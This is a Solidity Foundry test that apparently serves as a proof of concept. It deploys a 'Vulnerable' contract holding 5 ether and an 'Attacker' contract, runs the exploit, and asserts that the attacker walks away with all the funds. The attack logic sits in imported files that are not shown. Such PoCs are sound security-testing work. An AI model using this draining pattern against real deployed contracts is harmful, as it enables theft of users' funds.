// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Vulnerable} from "../src/Vulnerable.sol";
import {Attacker} from "../src/Attacker.sol";
import {Test, console2} from "forge-std/Test.sol";

contract POC is Test {
    Vulnerable public vulnerable;
    Attacker public attacker;

    function setUp() public {
        vulnerable = new Vulnerable();
        attacker = new Attacker(address(vulnerable));

        vm.deal(address(vulnerable), 5 ether);
    }

    function test_Exploit() public {
        // Call the exploit function from the attacker contract
        attacker.exploit{value: 1 ether}();

        // Check if the attacker's balance has increased
        assertEq(address(attacker).balance, 6 ether, "Attacker's balance should be greater than 0 after exploit");

        // Check if the vulnerable contract's balance has decreased
        assertEq(
            vulnerable.userBalance(address(attacker)), 0, "Vulnerable contract's balance should be 0 after exploit"
        );
    }
}
